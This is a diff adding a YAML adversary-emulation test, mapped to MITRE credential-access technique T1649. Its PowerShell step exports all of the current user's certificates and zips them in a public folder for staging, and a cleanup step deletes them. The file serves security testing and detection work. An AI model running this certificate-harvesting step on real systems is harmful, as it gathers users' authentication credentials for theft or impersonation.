@@ -1,0 +1,29 @@
+api_version: "2.0"
+name: Staging Local Certificates via Export-Certificate
+description: |
+    Export all user certificates and add to a compressed archive.
+uuid: eb121494-82d1-4148-9e2b-e624e03fbf3d
+mitre:
+    tactics:
+        - 'TA0006: Credential Access'
+    techniques:
+        - 'T1649: Steal or Forge Authentication Certificates'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: staging-local-certificates-via-export-certificate
+      inline: |
+        $archive="$env:PUBLIC\T1649\atomic_certs.zip"
+        $exfilpath="$env:PUBLIC\T1649\certs"
+        Add-Type -assembly "system.io.compression.filesystem"
+        Remove-Item $(split-path $exfilpath) -Recurse -Force -ErrorAction Ignore
+        mkdir $exfilpath | Out-Null
+        foreach ($cert in (gci Cert:\CurrentUser\My)) { Export-Certificate -Cert $cert -FilePath $exfilpath\$($cert.FriendlyName).cer}
+        [io.compression.zipfile]::CreateFromDirectory($exfilpath, $archive)
+      executor: powershell
+      cleanup:
+        inline: |
+            $exfilpath="$env:PUBLIC\T1649\certs"
+            Remove-Item $(split-path $exfilpath) -Recurse -Force -ErrorAction Ignore
+        executor: powershell
